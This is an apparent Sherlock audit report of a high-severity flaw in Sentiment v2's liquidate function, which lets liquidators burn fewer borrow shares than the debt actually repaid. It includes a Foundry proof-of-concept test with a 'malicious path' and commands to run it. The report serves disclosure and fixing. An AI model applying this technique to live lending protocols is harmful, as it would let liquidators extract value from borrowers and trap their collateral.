Scrawny Blonde Guppy

High

# Liquidators Are Incentivised To Create Imaginary Borrow Debt

## Summary

Liquidators have the freedom to control how many borrow shares are burned from a position during liquidation, regardless of the underlying capital that is taken.

This allows liquidators to liquidate positions but leave them in a state that they continue to grow unhealthy, **even though all outstanding debts have been repaid**.

## Vulnerability Detail

When liquidating a risky position via [`liquidate`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L430C14-L430C23), the liquidator has the freedom to specify the to be taken from the position (`assetData`) independently of the outstanding debt that is processed (`debtData`):

```solidity
/// @notice Liquidate an unhealthy position
/// @param position Position address
/// @param debtData DebtData object for debts to be repaid
/// @param assetData AssetData object for assets to be seized
function liquidate(
    address position,
    DebtData[] calldata debtData, /// @audit debtData_and_assetData_are_independent_of_one_another
    AssetData[] calldata assetData
) external nonReentrant {
    riskEngine.validateLiquidation(position, debtData, assetData);

    // liquidate
    _transferAssetsToLiquidator(position, assetData);
    _repayPositionDebt(position, debtData);

    // position should be within risk thresholds after liquidation
    if (!riskEngine.isPositionHealthy(position)) revert PositionManager_HealthCheckFailed(position);
    emit Liquidation(position, msg.sender, ownerOf[position]);
}
```

Due to insufficient validation, there is a discontinuity between the number of assets that are taken from a position versus the underlying shares that are burned.

We can demonstrate that due to this inconsistency, a liquidator can liquidate a position and has the power to control whether to burn all the outstanding borrows (i.e. make the position healthy again) or liquidate the same amount of assets but leave outstanding borrows (i.e. make the position healthy again but allow it to continue to grow unhealthy post liquidation, even though all obligations have been fully repaid).

In both instances, although all of debt is repaid, the liquidator can control the amount of borrow shares remaining; thus they can fully liquidate a position but allow the position to grow more unhealthy as a means of value extraction.

### LiquidationTest.t.sol

To verify the following proof of concept, copy the `testLiquidateUnfairly` function to [`test/LiquidationTest.t.sol`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/test/integration/LiquidationTest.t.sol#L12C10-L12C25):

```solidity
/// @notice The liquidator can leave outstanding debt obligations
/// @notice for fully-repaid loans.
function testLiquidateUnfairly() public {

    /// @notice The environment variable `SHOULD_LIQUIDATE_UNFAIRLY` can
    /// @notice can be used to toggle between the different cases:
    bool shouldLiquidateUnfairly = vm.envExists("SHOULD_LIQUIDATE_UNFAIRLY")
        && vm.envBool("SHOULD_LIQUIDATE_UNFAIRLY");

    /// @dev Prepare assets for the two users:
    asset1.mint(lender, 200e18);
    asset2.mint(user, 200e18);

    vm.prank(user);
        asset2.approve(address(positionManager), type(uint256).max);

    /// @dev Create positions for both users.
    (address userPosition, Action memory userAction)
        = newPosition(user, bytes32(uint256(0x123456789)));

    /// @dev Let's also assume the pool has deep liquidity:
    vm.startPrank(lender);
        asset1.approve(address(pool), type(uint256).max);
        pool.deposit(fixedRatePool, 100e18, lender);
    vm.stopPrank();

    /// @dev Let's create a borrow positions for the `user`:
    Action[] memory actions = new Action[](4);
    {
        vm.startPrank(user);
            actions[0] = userAction;
            actions[1] = deposit(address(asset2), 1e18);
            actions[2] = addToken(address(asset2));
            actions[3] = borrow(fixedRatePool, 0.5e18);
            positionManager.processBatch(userPosition, actions);
        vm.stopPrank();
    }

    /// @dev Created position is healthy:
    assertTrue(riskEngine.isPositionHealthy(userPosition));

    /// @dev Okay, let's assume due to market conditions,
    /// @dev asset2 deprecations and the position has become
    /// @dev liquidatable:
    vm.startPrank(protocolOwner);
        riskEngine.setOracle(address(asset2), address(new FixedPriceOracle(0.99e18))); // 1 asset2 = 0.99 eth
    vm.stopPrank();

    /// @dev Created position is unhealthy:
    assertFalse(riskEngine.isPositionHealthy(userPosition));

    (uint256 totalAssetValue, uint256 totalDebtValue, uint256 minReqAssetValue) = riskEngine.getRiskData(userPosition);

    console.log(
        shouldLiquidateUnfairly
            ? "Liquidating unfairly..."
            : "Liquidating fairly..."
    );

    uint256 positionShortfall = minReqAssetValue - totalAssetValue;
    assertEq(positionShortfall, 10000000000000000);

    /// @dev Liquidate the `userPosition`.
    asset1.mint(liquidator, 100 ether);
    vm.startPrank(liquidator);
        asset1.approve(address(positionManager), type(uint256).max);

        /// @notice Initial Liquidator Balances:
        assertEq(asset1.balanceOf(liquidator), 100000000000000000000);
        assertEq(asset2.balanceOf(liquidator), 0);

        /// @notice Initial Position Balances:
        assertEq(asset1.balanceOf(userPosition), 500000000000000000);
        assertEq(asset2.balanceOf(userPosition), 1000000000000000000);
        assertEq(protocol.pool().getBorrowsOf(fixedRatePool, userPosition), 500000000000000000);

        {
            // construct liquidator data
            DebtData[] memory debts = new DebtData[](1);
            debts[0] = DebtData({
                poolId: fixedRatePool,
                /// @notice In the fair case, the liquidator takes `500000000000000000`
                /// @notice borrow shares (`getBorrowsOf`). In the unfair case, the
                /// @notice liquidator need only take `10000000000000000`:
                amt: shouldLiquidateUnfairly ? 10000000000000000 : type(uint256).max
            });
            AssetData[] memory assets = new AssetData[](1);
            assets[0] = AssetData({ asset: address(asset2), amt: positionShortfall });
            positionManager.liquidate(userPosition, debts, assets);
        }

        assertTrue(riskEngine.isPositionHealthy(userPosition)) /* @notice Position is healthy immediately after. */;

        /// @notice First, notice the position's underlying assets are
        /// @notice liquidated identically for both the unfair liquidation
        /// @notice and the fair liquidation. This means in both instances,
        /// @notice all outstanding debt is repaid.
        assertEq(asset1.balanceOf(userPosition), 500000000000000000);
        assertEq(asset2.balanceOf(userPosition), 990000000000000000);

        assertEq(
            protocol.pool().getBorrowsOf(fixedRatePool, userPosition),
            /// @notice However, the unfair liquidation left outstanding borrow
            /// @notice shares even though the underlying assets were liquidated
            /// @notice consistently:
            shouldLiquidateUnfairly ? 490000000000000000 : 0
        );

        /// @notice When liquidating unfairly by leaving bad shares, the
        /// @notice liquidator spends less `asset1` in the process. This means
        /// @notice the protocol actually incentivises liquidators to act
        /// @notice maliciously:
        assertEq(
            asset1.balanceOf(liquidator),
            shouldLiquidateUnfairly
                ? 99990000000000000000 /// @audit The liquidator is charged less for leaving outstanding borrow shares.
                : 99500000000000000000
        );

        vm.warp(block.timestamp + 24 hours);

        /// @notice If the liquidator operates maliciously, the position
        /// @notice is unfairly liable to more liquidations as time progresses:
        assertEq(riskEngine.isPositionHealthy(userPosition), !shouldLiquidateUnfairly);
        console.log(
            string(
                abi.encodePacked(
                    "One day after liquidation, the position is ",
                    riskEngine.isPositionHealthy(userPosition) ? "healthy" : "unhealthy",
                    "."
                )
            )
        );

    vm.stopPrank();
}
```

Then run using:

```shell
SHOULD_LIQUIDATE_UNFAIRLY=false forge test --match-test "testLiquidateUnfairly" -vv # Happy path
SHOULD_LIQUIDATE_UNFAIRLY=true forge test --match-test "testLiquidateUnfairly" -vv # Malicious path
```

This confirms that liquidators have the choice to leave outstanding borrow shares on liquidated positions, even though for the exact same liquidation of assets, the position could have been left with zero outstanding borrow shares.

Additionally, we show that the liquidator actually returns less `asset1` to the pool, even though they are redeeming the same amount of underlying `asset2` from the liquidated position.

## Impact

Due to the monetary incentives, it is actually **more rational** for liquidators **to liquidate positions unfairly**.

This undermines the safety of all borrowers.

Additionally, imaginary borrow debt will prevent borrowers from being able to withdraw their own funds, even though all their debt was fairly repaid. Since the position's collateral cannot be withdrawn due to these imaginary outstanding borrow shares, this permits the malicious liquidator to repeatedly liquidate the position.

We can also anticipate that this debt would grow quite quickly, since the PoC demonstrates that after repaying all debt, the malicious liquidator can force the position into retaining `490000000000000000` / `500000000000000000` (98%) of the original borrow obligation.

## Code Snippet

```solidity
/// @notice Liquidate an unhealthy position
/// @param position Position address
/// @param debtData DebtData object for debts to be repaid
/// @param assetData AssetData object for assets to be seized
function liquidate(
    address position,
    DebtData[] calldata debtData,
    AssetData[] calldata assetData
) external nonReentrant {
    riskEngine.validateLiquidation(position, debtData, assetData);

    // liquidate
    _transferAssetsToLiquidator(position, assetData);
    _repayPositionDebt(position, debtData);

    // position should be within risk thresholds after liquidation
    if (!riskEngine.isPositionHealthy(position)) revert PositionManager_HealthCheckFailed(position);
    emit Liquidation(position, msg.sender, ownerOf[position]);
}
```

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L426C5-L444C6

## Tool used

Manual Review

## Recommendation

Do not permit liquidators the flexibility to control the number of borrow shares burned, instead, compute these as a function of the assets taken from the position.